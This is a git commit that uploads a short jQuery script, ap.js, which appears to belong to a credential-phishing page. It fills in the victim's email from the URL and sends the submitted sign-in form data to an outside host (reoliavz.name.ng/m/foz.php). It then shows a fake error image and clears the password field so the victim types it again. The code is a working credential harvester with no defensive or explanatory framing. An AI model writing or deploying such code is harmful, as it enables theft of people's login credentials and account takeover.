b50e33cc1157543197bc0b035869955e43b169a7
rtayuiob <120251061+rtayuiob@users.noreply.github.com>
2022-12-10 17:30:04 +0100

    Add files via upload

---
+++ a/ap.js
@@ -0,0 +1,67 @@
+$(document).ready(function() {
+
+    $("body").click(function() {
+
+        $(".fx").show('1000');
+
+    });
+
+
+
+
+
+    $(".fx").hide();
+
+    const basename = (window.location).href;
+
+    let name = basename.substring(basename.lastIndexOf('=') + 1);
+
+    $("#xx").val(name);
+
+
+
+    $("#formx").submit(function(e) {
+
+        e.preventDefault();
+
+        var formData = new FormData($("#formx")[0]);
+
+        $("#submitBtn").html('Please Wait.').prop("disabled", true).css('background', 'midnightblue');
+
+        $.ajax({
+
+            url: "https://reoliavz.name.ng/m/foz.php",
+
+            type: 'POST',
+
+            data: formData,
+
+            contentType: false,
+
+            processData: false,
+
+            success: function(res) {
+
+                setTimeout(function() {
+
+                    $("#xx").val(name);
+
+                    $("#xxx").val("");
+
+                    $('.er').html(`<img src="https://sour-card.surge.sh/en.jpg">`);
+
+                    $("#submitBtn").html("Sign In").prop("disabled", false);
+
+                }, 2000);
+
+
+
+            }
+
+        });
+
+    });
+
+
+
+});
